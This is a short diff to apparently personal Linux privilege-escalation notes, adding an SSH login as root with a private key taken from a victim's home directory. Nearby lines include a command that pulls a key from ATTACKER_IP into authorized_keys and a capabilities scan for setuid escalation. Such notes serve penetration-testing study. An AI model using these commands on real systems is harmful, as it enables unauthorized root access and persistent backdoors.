@@ -189,6 +189,12 @@ Step 3: Use sudo to escalate privs
 #ssh-keygen -t ed25519 -C "your_email@example.com"    #Sampe using command using Ed25519 algorithm, required formore recent systems
 #echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys    #Add public key to authorized keys
 
+# SSH using another users ssh key i.e root. "-o IdentitiesOnly=yes", explicity use identity associated with the private key ie root
+# The -o flag allows you to specify SSH configuration options directly on the command line.
+# IdentitiesOnly=yes tells SSH to only use the identity (private key) explicitly specified with 
+# the -i option (or in the SSH configuration file) and ignore any other identities that might be loaded by the SSH agent.
+ssh -o IdentitiesOnly=yes -i /home/victim/.ssh/root-id_rsa root@127.0.0.1
+
 
 #Setuid, Linux Capabilities and GTFO Bins
 /usr/sbin/getcap -r / 2>/dev/null    #Manually Enumerating Linux Capabilities for setuid capabilities enabled, along with the +ep flag specifying that capabilities are effective and permitted.
